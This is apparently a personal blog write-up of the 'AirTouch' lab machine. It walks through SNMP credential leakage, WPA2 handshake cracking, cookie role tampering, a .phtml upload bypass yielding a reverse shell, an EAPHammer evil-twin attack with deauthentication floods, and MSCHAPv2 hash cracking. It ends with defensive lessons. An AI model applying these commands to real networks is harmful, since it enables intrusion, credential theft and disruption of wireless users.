
# Introduction

AirTouch is a Linux-based machine simulating a segmented wireless enterprise environment. The attack path requires a combination of standard network enumeration techniques and specialized wireless attacks.  
The chain involves identifying credentials exposed through an unusual service, performing lateral movement across multiple VLANs via router exploitation, and executing a targeted Evil Twin attack against a WPA2-Enterprise infrastructure to fully compromise the environment.

---
# Initial Enumeration
## 1. External Enumeration

### TCP Scan

```bash
sudo nmap -sV -p- -T4 airtouch.htb
````

```
# PORT   STATE SERVICE VERSION
# 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
```

The TCP scan reveals a single exposed service: SSH on port 22, suggesting a deliberately limited TCP attack surface.

---

### UDP Scan

```bash
sudo nmap -sU --top-ports 200 -T4 airtouch.htb
```

```
68/udp  open|filtered dhcpc  
137/udp open|filtered netbios-ns  
161/udp open          snmp  
407/udp open|filtered timbuktu  
514/udp open|filtered syslog  
1645/udp open|filtered radius
```

Unlike TCP, the UDP scan exposes multiple services. The presence of SNMP on port 161 is particularly interesting, as it is commonly misconfigured and can leak sensitive information.

We proceed to enumerate the SNMP service using default scripts.

```bash
sudo nmap -sU -sC -p 161 airtouch.htb
```

```
| snmp-sysdescr: "The default consultant password is: RxBlZhLmOkacNWScmZ6D (change it after use it)"
```

The system description directly discloses a plaintext password.

**Credentials found:** `consultant:RxBlZhLmOkacNWScmZ6D`

---
## 2. Initial Foothold (Consultant Host)

Using the credentials obtained via SNMP enumeration, we authenticate to the target machine.

```bash
ssh consultant@airtouch.htb
```

### Local Enumeration

Inside the home directory, we identify network-related artifacts, including a topology diagram (`diagram-net.png`) and additional reference images, which provide useful context about the internal network layout.

![airtouch_1.png](https://gianlucabassani.github.io/assets/airtouch/airtouch_1.png)

We then check the sudo privileges assigned to the consultant user.

```bash
sudo -l
```

```
Matching Defaults entries for consultant on AirTouch-Consultant:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
```

The consultant user is allowed to execute any command as root without authentication. This level of access is required to manipulate wireless interfaces and perform monitor-mode operations.

We escalate privileges to root.

```bash
sudo su
```

```
root@AirTouch-Consultant:~# ls
eaphammer
```

Once root access is obtained, we observe that **eaphammer** is already present in the `/root` directory. The **aircrack-ng** suite is also available on the system, confirming that the host is preconfigured for advanced wireless attack operations.

---
## 3. Wireless Reconnaissance

With root privileges on the consultant host, we enumerated the wireless environment to identify reachable networks.

We enabled the wireless interface and switched it to monitor mode.

```bash
ip link set wlan0 up
airmon-ng start wlan0
````

```bash
airodump-ng wlan0mon
````

```
CH 12 ][ Elapsed: 3 mins ][ 2026-01-18 23:16

BSSID              PWR  Beacons  #Data  CH  ENC   CIPHER AUTH ESSID
F0:9F:C2:A3:F1:A7  -28     167      14   6  CCMP  PSK    AirTouch-Internet
DA:F2:2A:D0:95:70  -28     167       0   6  CCMP  PSK    WIFI-JOHN
EA:6E:52:7D:5C:EA  -28     169       0   9  WPA2  CCMP   PSK  MiFibra-24-D4VY
02:1B:38:1D:0C:84  -28     331       0   3  CCMP  PSK    MOVISTAR_FG68
0A:6F:AA:99:A9:15  -28    2335       0   1  TKIP  PSK    vodafoneFB6N

BSSID              STATION            PWR  Frames  Probes
F0:9F:C2:A3:F1:A7  28:6C:07:FE:A3:22  -29     14
(not associated)   C8:8A:9A:6F:F9:D2  -29     24     AccessLink, AirTouch-Office
(not associated)   28:6C:07:12:EE:A1  -29     18     AirTouch-Office
(not associated)   28:6C:07:12:EE:F3  -29     12     AirTouch-Office
```

**Observations**

* **AirTouch-Internet** is a visible WPA2-PSK network on channel 6.
* **AirTouch-Office** is not broadcasting and is only observed through client probe requests.

---
## 4. Lateral Movement: Tablets VLAN (WPA2-PSK)

To pivot further, we targeted the **AirTouch-Internet** network by capturing and cracking a WPA2 4-way handshake.

### Handshake Capture

```bash
airodump-ng -c 6 --bssid F0:9F:C2:A3:F1:A7 -w airtouch_psk wlan0mon
```

A client was already associated with the access point, allowing passive handshake capture.

### PSK Cracking

```bash
aircrack-ng airtouch_psk-01.cap -w rockyou.txt
```

```
KEY FOUND! [ challenge ]
```

### Network Access

We now need to gain a valid ip to comunicate with this vlan:

```bash
wpa_passphrase "AirTouch-Internet" "challenge" > /tmp/internet.conf
wpa_supplicant -B -i wlan3 -c /tmp/internet.conf
dhclient wlan3
```

IP: `inet 192.168.3.46`

An IP address in the `192.168.3.0/24` range confirmed access to the Tablets VLAN.

---
## 5. Router Exploitation (192.168.3.1)

After obtaining access to the Tablets VLAN (`192.168.3.0/24`), we identified the default gateway at `192.168.3.1`. 
A quick scan confirmed that the device was exposing an HTTP service on port 80, indicating the presence of a management web interface.

### Port Forwarding

Since the router was only reachable from inside the VLAN, we used SSH local port forwarding to access the web interface from our attacking machine.

```bash
ssh -L 8080:192.168.3.1:80 consultant@airtouch.htb
````

Navigating to `http://localhost:8080` displayed a login panel for the router’s management interface.
![airtouch_2.png](https://gianlucabassani.github.io/assets/airtouch/airtouch_2.png)

---
### Wireless Traffic Decryption (Wireshark)

At this stage, no valid credentials were available for the web application. However, because we had already cracked the WPA2-PSK for **AirTouch-Internet** (`challenge`), we could decrypt captured wireless traffic.

**Encrypted view:**
![airtouch_3.png](https://gianlucabassani.github.io/assets/airtouch/airtouch_3.png)


We loaded the previously captured `.cap` file into Wireshark and configured Wi-Fi decryption:

* **Edit → Preferences → Protocols → IEEE 802.11**
* Enabled **Decryption**
* Added a key using the format:

```
wpa-pwd:challenge:AirTouch-Internet
```


Once configured, the previously encrypted 802.11 traffic was transparently decrypted, revealing cleartext HTTP requests and responses.

![airtouch_4.png](https://gianlucabassani.github.io/assets/airtouch/airtouch_4.png)


By following the HTTP streams, we identified:
* A valid `PHPSESSID`
* A `UserRole` cookie set to `user`

---
### Cookie Manipulation and Privilege Escalation

Using the captured session cookie, we authenticated to the web interface without valid credentials. 

![airtouch_5.png](https://gianlucabassani.github.io/assets/airtouch/airtouch_5.png)

By manually modifying the `UserRole` cookie from `user` to `admin` (via browser developer tools), we unlocked additional administrative functionality.

![airtouch_6.png](https://gianlucabassani.github.io/assets/airtouch/airtouch_6.png)


This included a previously hidden **file upload** feature.

---
### File Upload Bypass and Code Execution

The upload functionality attempted to block PHP files based on file extension filtering. To bypass this restriction, we uploaded a standard PHP reverse shell renamed with an uncommon`.phtml` extension, which is still interpreted by Apache as PHP.

Triggering the uploaded payload resulted in a reverse shell as the `www-data` user on the router.

```bash
nc -nvlp 4444  
#Connection received on [192.168.3.1](https://192.168.3.1/ "https://192.168.3.1/") 35882
```

```bash
whoami  
# www-data
```

---
### Credential Discovery

With filesystem access, we inspected the web root and identified hardcoded credentials inside `login.php`.

```php
if (isset($_POST['Submit'])) {  
  /* Define username, associated password, and user attribute array */  
  $logins = array(  
    /*'user' => array('password' => 'JunDRDZKHDnpkpDDvay', 'role' => 'admin'),*/  
    'manager' => array('password' => '2wLFYNh4TSTgA5sNgT4', 'role' => 'user')  
  );
```

**Credentials:**
- `user:2wLFYNh4TSTgA5sNgT4`
- `admin:JunDRDZKHDnpkpDDvay`

---
### SSH Access to the Router

Using the recovered user credentials, we authenticated directly to the router via SSH.

```bash
ssh user@192.168.3.1

```

The user was allowed to execute any command as root without a password.

```bash
sudo su

```

Root access on the gateway was successfully obtained.

---
### Post-Exploitation

After elevating to root, we navigated to the home directory to retrieve the first flag.

```bash
cd /root
cat user.txt
```

**User Flag:** `1b3689cb0<SNIP>`

While enumerating the system, we discovered a script named `send_certs.sh`. This script was designed to automate the transfer of certificate files to the next network segment: the **AirTouch-Office** gateway (`10.10.10.1`).

```bash
cat send_certs.sh
```

```bash
<SNIP>
REMOTE_USER="remote"
REMOTE_PASSWORD="xGgWEwqUpfoOVsLeROeG"
REMOTE_PATH="~/certs-backup/"
LOCAL_FOLDER="/root/certs-backup/"
<SNIP>
```

The script contained cleartext credentials for a user named `remote`, which would later be used to pivot into the Corporate VLAN.

**Credentials:** `remote:xGgWEwqUpfoOVsLeROeG`

---
## 6. Exfiltration & Intelligence Gathering

Inside the router (`AirTouch-AP-PSK`), we identified critical assets in the `~/certs-backup` directory.

**1. Certificates (Required for Evil Twin):**
A `certs-backup` folder contained the valid CA and Server certificates required to bypass client-side validation during an Evil Twin attack.

**Exfiltration:**
We used SCP to copy the certificates back to our attacking machine (`AirTouch-Consultant`) to prepare the attack.

```bash
scp -r user@192.168.3.1:~/certs-backup ~/loot/
```

We verified the contents of the exfiltrated directory:

```bash
ls ~/loot/
# ca.crt  server.crt  server.key ..
```

---
## 7. The Evil Twin Attack (AirTouch-Office)

With valid certificates in hand, we could now impersonate the corporate network `AirTouch-Office` and capture user hashes.

### Setup

We imported the stolen certificates into **EAPHammer**.

```bash
./eaphammer --cert-wizard import \
  --server-cert ~/loot/server.crt \
  --private-key ~/loot/server.key \
  --ca-cert ~/loot/ca.crt

```

### Execution

We launched the Rogue AP on `wlan4` (Channel 44), matching the legitimate network's operating channel, and simultaneously deauthenticated clients from the other 2 real APs using another interface.

**Terminal 1 (Rogue AP):**

```bash
./eaphammer -i wlan4 --essid AirTouch-Office --channel 44 --auth wpa-eap --creds --negotiate balanced
```

**Terminal 2-3 (Deauth Attack):**

```bash
sudo aireplay-ng -0 0 -D -a C:8B:A9:F3:A1 wlan5
sudo aireplay-ng -0 0 -D -a AC:8B:A9:AA:3F:D2 wlan5
```

A client roamed to our Rogue AP. We successfully captured the MSCHAPv2 challenge/response hash.

```text
mschapv2: Sat Jan 31 14:20:43 2026
         domain\username:               AirTouch\r4ulcl
         username:                      r4ulcl
         challenge:                     0b:cf:5e:2e:f6:24:b1:9d
         response:                      bc:0c:39:bb:2a:a5:46:5c:ec:72:1d:5a:81:b8:8c:6b:a0:c3:ba:6a:48:80:7d:82

         jtr NETNTLM:                   r4ulcl:$NETNTLM$0bcf5e2ef624b19d$bc0c39bb2aa5465cec721d5a81b88c6ba0c3ba6a48807d82

         hashcat NETNTLM:               r4ulcl::::bc0c39bb2aa5465cec721d5a81b88c6ba0c3ba6a48807d82:0bcf5e2ef624b19d
```

### Cracking

We cracked the captured NetNTLMv1 hash using John the Ripper.

```bash
john --format=netntlm hash.txt --wordlist=../rockyou.txt
```

```
laboratory       (r4ulcl)
```

**Credentials:** `r4ulcl:laboratory`

---
## 8. Lateral Movement: Corporate VLAN

We used the cracked credentials to authenticate to the legitimate corporate network via the `wlan4` interface.

### Configuration

We created a specific `wpa_supplicant` configuration file. Note that the domain `AirTouch\` was required in the identity field, as observed in the EAPHammer logs.

```bash
cat <<EOF > /tmp/wpa_connect.conf
ctrl_interface=/var/run/wpa_supplicant
network={
    ssid="AirTouch-Office"
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="AirTouch\\r4ulcl"
    password="laboratory"
    phase2="auth=MSCHAPV2"
}
EOF
```

```bash
sudo wpa_supplicant -B -i wlan4 -c /tmp/wpa_connect.conf
sudo dhclient -v wlan4
```

```
bound to 10.10.10.10 -- renewal in 399699 seconds.
```

We successfully obtained an IP address in the `10.10.10.0/24` subnet.

---
## 9. Management Host & Root

We pivoted to the Management Host (`10.10.10.1`) using the `remote` credentials recovered earlier from the `send_certs.sh` script.

```bash
ssh remote@10.10.10.1
```

### Enumeration

Upon access, we attempted to list sudo privileges but found the user restricted. We then checked running processes to identify the RADIUS/WiFi management service.

```bash
ps aux
```

```
<SNIP>
root          44  0.1  0.1  10676  7900 ?        S    12:38   0:13 hostapd_aps /root/mgt/hostapd_wpe.co
root          45  0.0  0.1  10728  7968 ?        S    12:38   0:06 hostapd_aps /root/mgt/hostapd_wpe2.c
<SNIP>
```

We then searched for hardcoded credentials in configuration files:



```bash
grep -r password /etc/ /opt/ /home/* 2>/dev/null
```

And than read the tail of the `hostapd_wpe.eap_user` file, which serves as the authentication database for the enterprise network.

```bash
tail /etc/hostapd/hostapd_wpe.eap_user
```

```
"AirTouch\r4ulcl"                           MSCHAPV2            "laboratory" [2]
"admin"                                 MSCHAPV2                "xMJpzXt4D9ouMuL3JJsMriF7KZozm7" [2]

```

This file revealed the cleartext credentials for the `admin` user.

**Credentials:** `admin:xMJpzXt4D9ouMuL3JJsMriF7KZozm7`

### Root Escalation

We switched to the `admin` user using the recovered password.

```bash
su admin
```

We verified sudo privileges for the admin user.

```bash
sudo -l
```

```
User admin may run the following commands on AirTouch-AP-MGT:
    (ALL) ALL
    (ALL) NOPASSWD: ALL
```

The admin user had unrestricted sudo access. We escalated to root and retrieved the final flag.

```bash
sudo su
cat /root/root.txt
```

**Root Flag:** `ebc68dd8<SNIP>`

---
# Conclusions

* **Information Leakage:** The initial foothold was granted solely due to a misconfigured SNMP service exposing plaintext credentials in the system description, highlighting the importance of restricting management protocols.
    
* **Wireless Segmentation Failure:** Network segmentation was rendered ineffective by weak security controls on the intermediate "Tablets" VLAN (WPA2-PSK with a weak password) and the compromised router, which acted as a bridge to the corporate environment.
    
* **Credential Management:** Hardcoded credentials were pervasive throughout the environment—found in SNMP configurations, PHP web application source code, automation scripts (`send_certs.sh`), and RADIUS configuration files (`hostapd_wpe.eap_user`).
    
* * **Trust Relationships:** The WPA2-Enterprise security relied entirely on the secrecy of the RADIUS server certificates. Once the router was compromised and certificates exfiltrated, the trust chain was broken, allowing a successful Evil Twin attack against corporate clients.